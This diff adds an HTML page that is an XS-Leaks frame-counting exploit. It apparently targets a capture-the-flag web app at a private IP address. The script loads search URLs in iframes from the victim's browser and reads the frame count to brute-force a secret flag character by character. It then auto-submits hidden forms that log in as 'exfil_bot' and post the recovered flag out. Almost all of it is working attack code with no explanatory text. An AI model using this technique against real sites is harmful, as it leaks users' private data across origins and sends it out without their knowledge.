@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>XS-Leaks Exploit - Form version</title>
+</head>
+<body>
+<h1>XS-Leaks Frame Counting - Form Exfil</h1>
+<pre id="log"></pre>
+
+<!-- Hidden forms for exfiltration -->
+<form id="login_form" action="http://10.10.100.11:33333/login" method="POST" target="hidden_frame">
+  <input name="username" value="exfil_bot">
+  <input name="password" value="exfil_pass">
+</form>
+<form id="post_form" action="http://10.10.100.11:33333/post" method="POST" target="hidden_frame">
+  <input name="title" id="post_title" value="FLAG_RESULT">
+  <input name="content" id="post_content" value="">
+</form>
+<iframe name="hidden_frame" style="display:none"></iframe>
+
+<script>
+const WEB_URL = "http://10.10.100.11:33333";
+const CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz_";
+const FLAG_PREFIX = "FLAG{";
+const WAIT_MS = 2500;
+
+let found = FLAG_PREFIX;
+let logEl = document.getElementById("log");
+
+function log(msg) {
+    logEl.textContent += msg + "\n";
+    console.log(msg);
+}
+
+function sleep(ms) {
+    return new Promise(r => setTimeout(r, ms));
+}
+
+async function checkChar(c) {
+    let testQuery = found + c;
+    let url = WEB_URL + "/?query=" + encodeURIComponent(testQuery);
+    
+    return new Promise((resolve) => {
+        let iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.style.width = '1px';
+        iframe.style.height = '1px';
+        
+        let timeout = setTimeout(() => {
+            try { document.body.removeChild(iframe); } catch(e) {}
+            log("query=" + testQuery + " TIMEOUT");
+            resolve({ char: c, count: -1 });
+        }, 10000);
+        
+        iframe.onload = function() {
+            clearTimeout(timeout);
+            let count = 0;
+            try {
+                count = iframe.contentWindow.length;
+            } catch(e) {}
+            try { document.body.removeChild(iframe); } catch(e) {}
+            log("query=" + testQuery + " frames=" + count);
+            resolve({ char: c, count: count });
+        };
+        
+        document.body.appendChild(iframe);
+    });
+}
+
+function saveResult(flag) {
+    log("Saving via form: " + flag);
+    document.getElementById("post_content").value = flag;
+    
+    // First login
+    document.getElementById("login_form").submit();
+    
+    // Then post after a delay
+    setTimeout(() => {
+        document.getElementById("post_form").submit();
+        log("Form submitted!");
+    }, 1000);
+}
+
+async function bruteForce() {
+    log("Starting XS-Leaks Frame Counting (form exfil)...");
+    log("Target: " + WEB_URL);
+
+    while (!found.endsWith("}") && found.length < 30) {
+        log("Prefix: " + found);
+        let foundNext = false;
+
+        for (let c of CHARSET) {
+            let result = await checkChar(c);
+            if (result.count > 0) {
+                found += c;
+                foundNext = true;
+                log(">>> FOUND: " + c + " -> " + found);
+                break;
+            }
+            await sleep(300);
+        }
+
+        if (!foundNext) {
+            let result = await checkChar("}");
+            if (result.count > 0) {
+                found += "}";
+                log(">>> COMPLETE: " + found);
+                break;
+            }
+            log("!!! STUCK at: " + found);
+            saveResult("STUCK:" + found);
+            break;
+        }
+    }
+
+    log("FINAL: " + found);
+    saveResult(found);
+}
+
+setTimeout(() => bruteForce().catch(e => log("FATAL: " + e)), 1000);
+</script>
+</body>
+</html>
